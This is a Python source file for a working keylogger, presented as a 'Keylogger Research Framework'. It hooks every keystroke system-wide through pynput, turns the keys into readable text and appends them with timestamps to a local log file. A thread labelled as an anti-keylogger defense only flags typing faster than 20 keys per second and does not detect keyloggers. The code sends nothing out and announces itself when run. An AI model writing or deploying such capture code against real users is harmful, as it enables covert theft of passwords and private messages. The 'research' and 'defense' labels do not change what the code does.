import os
import time
import threading
import queue
from pynput import keyboard

class KeyloggerResearchFramework:
    def __init__(self, log_file="research_capture.txt", flush_interval=10):
        self.log_file = log_file
        self.flush_interval = flush_interval
        self.buffer = []
        self.event_queue = queue.Queue()
        self.is_running = True
        
        # Security Analysis Metrics
        self.keystroke_count = 0
        self.start_time = time.time()

    def _parse_key(self, key):
        """Translates raw OS key events into clean, human-readable strings."""
        try:
            return key.char
        except AttributeError:
            # Format special keys cleanly for log analysis
            if key == keyboard.Key.space:
                return " "
            elif key == keyboard.Key.enter:
                return "\n[ENTER]\n"
            elif key == keyboard.Key.backspace:
                return "[BACKSPACE]"
            elif key == keyboard.Key.tab:
                return "[TAB]"
            elif key in [keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
                return "[CTRL]"
            elif key in [keyboard.Key.shift, keyboard.Key.shift_r]:
                return "" # Ignored to keep output clean, characters capture case automatically
            else:
                return f"[{str(key).replace('Key.', '').upper()}]"

    def _process_queue(self):
        """Asynchronously processes key events from the queue to ensure zero lag."""
        while self.is_running or not self.event_queue.empty():
            try:
                key_event = self.event_queue.get(timeout=1)
                parsed_key = self._parse_key(key_event)
                if parsed_key:
                    self.buffer.append(parsed_key)
                    self.keystroke_count += 1
                self.event_queue.task_done()
            except queue.Empty:
                continue

    def _flush_buffer_to_disk(self):
        """Periodically flushes the memory buffer to disk to reduce I/O footprint."""
        while self.is_running:
            time.sleep(self.flush_interval)
            if self.buffer:
                data_to_write = "".join(self.buffer)
                self.buffer.clear()
                
                # Write with timestamp headers for forensic analysis
                timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                with open(self.log_file, "a", encoding="utf-8") as f:
                    f.write(f"\n--- Log Block: {timestamp} ---\n")
                    f.write(data_to_write)
                    f.write("\n")

    def run_defense_check(self):
        """
        Simulates an anti-keylogger defense mechanism.
        Monitors input frequency anomalies to detect potential automation or scraping.
        """
        print("[*] Defensive Module Active: Monitoring process input metrics...")
        while self.is_running:
            time.sleep(5)
            elapsed = time.time() - self.start_time
            if elapsed > 0:
                speed = self.keystroke_count / elapsed
                # Alert if keystroke speed crosses unrealistic thresholds (Simulating automated input injection)
                if speed > 20: 
                    print(f"\n[ALERT] High-frequency input anomaly detected! ({speed:.2f} keys/sec)")

    def on_press(self, key):
        if not self.is_running:
            return False
        self.event_queue.put(key)

    def on_release(self, key):
        # Graceful exit condition for laboratory environments using 'Esc'
        if key == keyboard.Key.esc:
            print("\n[-] Terminating research framework safely...")
            self.is_running = False
            return False

    def start(self):
        print("[+] Initializing Cybersecurity Keylogger Research Framework...")
        print(f"[+] Output log file designated: {os.path.abspath(self.log_file)}")
        print("[!] PRESS 'ESC' AT ANY TIME TO STOP THE TOOL AND DUMP REMAINING LOGS.\n")

        # Spin up concurrent worker threads
        threading.Thread(target=self._process_queue, daemon=True).start()
        threading.Thread(target=self._flush_buffer_to_disk, daemon=True).start()
        threading.Thread(target=self.run_defense_check, daemon=True).start()

        # Start the native OS hook
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
        
        # Final cleanup dump on exit
        if self.buffer:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(f"\n--- Final Session Dump: {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
                f.write("".join(self.buffer))

if __name__ == "__main__":
    # Initialize framework with a 5-second buffer write interval for immediate feedback
    framework = KeyloggerResearchFramework(log_file="security_capture.txt", flush_interval=5)
    framework.start()